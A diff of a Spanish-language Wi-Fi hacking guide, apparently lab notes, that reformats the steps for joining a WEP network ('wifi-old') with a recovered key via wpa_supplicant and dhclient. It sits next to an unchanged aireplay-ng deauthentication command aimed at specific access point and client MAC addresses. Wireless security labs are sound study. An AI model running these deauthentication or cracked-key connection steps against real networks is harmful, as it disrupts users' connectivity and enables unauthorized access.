@@ -67,16 +67,26 @@
 - **wifi-old-01.cap:** Es el nombre del archivo de captura que contiene los datos de tráfico de red recolectados previamente.
 
 ### 7. Conexión a la red WEP
-
-    nano wep.conf
-
-    network={
-      ssid="wifi-old"
-      key_mgmt=NONE
-      wep_key0=$PASSWORD
-      wep_tx_keyidx=0
-    }
-
+```
+sudo airmon-ng stop wlan0mon
+```
+```
+sudo nano wep.conf
+```
+```
+network={
+  ssid="wifi-old"
+  key_mgmt=NONE
+  wep_key0=$PASSWORD
+  wep_tx_keyidx=0
+}
+```
+```
+sudo wpa_supplicant -D nl80211 -i wlan0 -c wep.conf
+```
+```
+sudo dhclient wlan0 -v
+```
 ### Desautenticación en redes Wi-Fi
 
     sudo aireplay-ng -0 0 -a F0:9F:C2:71:22:1A -c 64:32:A8:07:6C:40 wlan0mon
